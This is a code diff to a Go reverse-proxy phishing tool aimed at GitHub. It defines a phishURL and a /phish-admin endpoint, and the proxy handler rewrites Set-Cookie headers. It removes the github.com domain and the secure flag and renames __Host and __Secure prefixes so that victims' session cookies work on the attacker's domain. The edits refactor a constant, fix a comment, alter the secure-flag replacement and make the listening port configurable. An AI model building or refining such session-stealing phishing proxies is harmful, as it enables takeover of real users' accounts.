@@ -11,9 +11,7 @@ import (
 	"flag"
 )
 
-const (
-	upstreamURL = "https://github.com"	
-)
+const upstreamURL = "https://github.com"
 
 var (
 	phishURL string
@@ -106,8 +104,8 @@ func handler(w http.ResponseWriter, r *http.Request) {
 	// Cookie 處理
 	for _, v := range header["Set-Cookie"] {
 		newValue := strings.Replace(v, "domain=.github.com;", "", -1)
-		newValue = strings.Replace(newValue, "secure;", "", -1)
-		// __ 開頭Cookei  Transfer
+		newValue = strings.Replace(newValue, "secure;", "", 1)
+		// __ 開頭Cookie  Transfer
 		// __Host-user-session -> XXHost-user-session
 		// __Secure-cookie-name -> XXSecure-cookie-name
 		newValue = strings.Replace(newValue, "__Host", "XDHost", -1)
@@ -163,7 +161,7 @@ func main() {
 	// http server
 	http.HandleFunc("/", handler)
 	http.HandleFunc("/phish-admin", adminHandler)
-	err := http.ListenAndServe(":8080", nil)
+	err := http.ListenAndServe(port, nil)
 	if err != nil {
 		panic(err)
 	}
